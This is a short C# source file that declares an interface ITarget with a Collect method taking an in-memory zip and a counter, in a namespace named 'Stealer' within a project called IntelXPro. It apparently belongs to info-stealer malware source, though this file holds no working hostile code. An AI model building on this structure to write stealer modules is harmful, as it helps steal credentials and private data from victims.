using IntelXPro.src.IntelXPro.Dependencies.Data;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace IntelXPro.src.IntelXPro.Stealer
{
    internal interface ITarget
    {
        void Collect(InMemoryZip zip, Counter counter);
    }
}
